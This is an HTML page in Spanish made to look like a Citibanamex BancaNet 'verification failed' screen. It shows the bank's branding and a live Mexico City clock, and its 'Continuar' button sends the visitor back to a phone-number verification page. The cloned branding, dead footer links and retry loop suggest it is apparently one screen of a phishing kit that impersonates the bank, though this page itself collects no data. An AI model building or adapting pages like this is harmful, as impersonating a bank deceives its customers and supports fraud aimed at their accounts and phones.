<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banamex | Verificación fallida</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --teal: #033540;
            --teal-soft: #0a4a57;
            --red: #FF1E42;
            --bg: #ffffff;
            --text: #111827;
            --muted: #6b7280;
        }

        body {
            background-color: #ffffff;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ================= BARRA SUPERIOR ================= */
        .top-utility-bar {
            background-color: #033540;
            color: #ffffff;
            font-size: 11px;
            font-weight: 600;
            padding: 8px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .top-bar-inner {
            max-width: 1140px;
            width: 100%;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .top-links {
            display: flex;
            align-items: center;
            gap: 14px;
            letter-spacing: 0.5px;
        }

        .top-links a {
            color: #ffffff;
            text-decoration: none;
            transition: opacity 0.2s;
        }

        .top-links a:hover { opacity: 0.8; }

        .top-links .divider {
            color: rgba(255, 255, 255, 0.35);
            font-weight: 300;
        }

        /* ================= CONTENEDOR PRINCIPAL ================= */
        .main-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 28px 16px 64px 16px;
        }

        .hero-frame {
            background-color: #033540;
            width: 100%;
            max-width: 1140px;
            border-radius: 24px;
            padding: 24px 36px 36px 36px;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: stretch;
            min-height: 540px;
        }

        .header-cutout {
            position: absolute;
            top: 0;
            left: 0;
            background-color: #ffffff;
            width: 340px;
            height: 60px;
            border-bottom-right-radius: 26px;
            display: flex;
            align-items: center;
            padding-left: 12px;
            z-index: 4;
        }

        .brand-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .brand-name {
            color: #033540;
            font-weight: 700;
            font-size: 22px;
            letter-spacing: -0.5px;
        }

        .brand-divider {
            width: 1.5px;
            height: 24px;
            background-color: #033540;
            margin: 0 2px;
        }

        .brand-sub {
            color: #033540;
            font-weight: 400;
            font-size: 17px;
        }

        /* ================= TARJETA BLANCA ================= */
        .step-card {
            background-color: #ffffff;
            border-radius: 20px;
            padding: 26px 26px 30px 26px;
            margin-top: 52px;
            width: 100%;
            max-width: 380px;
            position: relative;
            z-index: 3;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            min-height: 460px;
            justify-content: center;
        }

        .error-icon-wrap {
            width: 80px;
            height: 80px;
            background-color: #fdecef;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .error-title {
            font-size: 22px;
            font-weight: 700;
            color: var(--red);
            margin-bottom: 12px;
        }

        .error-text {
            font-size: 15px;
            color: var(--muted);
            line-height: 1.5;
            margin-bottom: 28px;
        }

        .btn-primary {
            width: 100%;
            height: 48px;
            background-color: var(--teal);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
        }

        .btn-primary:hover { background-color: var(--teal-soft); }
        .btn-primary:active { transform: scale(0.98); }

        /* Responsive */
        @media (max-width: 600px) {
            .main-container { padding: 16px 10px 40px 10px; }
            .hero-frame { padding: 14px; border-radius: 16px; min-height: auto; }
            .header-cutout { width: 230px; height: 48px; border-bottom-right-radius: 20px; }
            .brand-name { font-size: 17px; }
            .brand-sub { font-size: 13px; }
            .step-card { padding: 22px 18px 24px; margin-top: 42px; }
            .error-title { font-size: 20px; }
        }
    </style>
</head>
<body>

<!-- Barra superior -->
<div class="top-utility-bar">
    <div class="top-bar-inner">
        <span class="live-clock" id="liveClock"></span>
        <div class="top-links">
            <a href="#">Privacidad</a>
            <span class="divider">|</span>
            <a href="#">Términos</a>
            <span class="divider">|</span>
            <a href="#">Ayuda</a>
        </div>
    </div>
</div>

<!-- Contenedor principal -->
<div class="main-container">
    <div class="hero-frame">
        <div class="header-cutout">
            <div class="brand-logo">
                <span class="brand-name">Citibanamex</span>
                <span class="brand-divider"></span>
                <span class="brand-sub">BancaNet</span>
            </div>
        </div>

        <div class="step-card">
            <div class="error-icon-wrap">
                <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#FF1E42" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="15" y1="9" x2="9" y2="15"></line>
                    <line x1="9" y1="9" x2="15" y2="15"></line>
                </svg>
            </div>

            <h1 class="error-title">Verificación fallida</h1>
            <p class="error-text">No pudimos verificar tu número de celular. Por favor, intenta nuevamente o contacta a servicio al cliente.</p>

            <button class="btn-primary" onclick="window.location.href='verificacion-celular.html'">Continuar</button>
        </div>
    </div>
</div>

<script>
    /* Reloj con hora de México */
    const clockElement = document.getElementById('liveClock');
    const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
    const meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];

    function updateClock() {
        const now = new Date();
        const opts = { timeZone: 'America/Mexico_City' };
        const mx = new Date(now.toLocaleString('en-US', opts));
        const diaSemana = dias[mx.getDay()];
        const dia = mx.getDate();
        const mes = meses[mx.getMonth()];
        const anio = mx.getFullYear();
        const horas = String(mx.getHours()).padStart(2, '0');
        const minutos = String(mx.getMinutes()).padStart(2, '0');
        const segundos = String(mx.getSeconds()).padStart(2, '0');
        clockElement.textContent = `${diaSemana} ${dia} de ${mes} de ${anio}, ${horas}:${minutos}:${segundos}`;
    }
    updateClock();
    setInterval(updateClock, 1000);
</script>

</body>
</html>
